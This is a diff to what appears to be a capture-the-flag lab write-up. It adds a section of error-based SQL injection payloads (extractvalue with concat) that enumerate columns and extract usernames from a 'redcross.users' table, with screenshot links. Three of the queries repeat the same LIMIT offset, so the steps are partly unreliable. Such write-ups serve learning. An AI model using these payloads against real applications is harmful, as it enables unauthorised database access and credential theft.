@@ -113,3 +113,14 @@ Machine IP: 10.10.10.113 - Debian
   - Query (Column 5): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 5,1)))-- -`.
 ![image](https://user-images.githubusercontent.com/83878909/229364516-a25c1339-8f3c-4d66-8691-251dab9d1289.png)
 - Columns Found: id, username, password, mail and role.
+
+## Usernames and Passwords
+  - Extract: Usernames and passwords.
+  - Query (User 1): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 0,1)))-- -`.
+![image](https://user-images.githubusercontent.com/83878909/229365056-4de5f991-d941-4753-9d09-866688fd02f2.png)
+  - Query (User 2): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1)))-- -`.
+![image](https://user-images.githubusercontent.com/83878909/229365145-8c217e2e-6269-46c4-a8c6-3eb3f79cc853.png)
+  - Query (User 3): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1)))-- -`.
+![image](https://user-images.githubusercontent.com/83878909/229365296-3ff1f74f-2180-4c29-8111-83d82aeaebf8.png)
+  - Query (User 4): `') and extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1)))-- -`.
+![image](https://user-images.githubusercontent.com/83878909/229365253-75ce97e6-d60d-4278-9881-9c0b5cc94add.png)
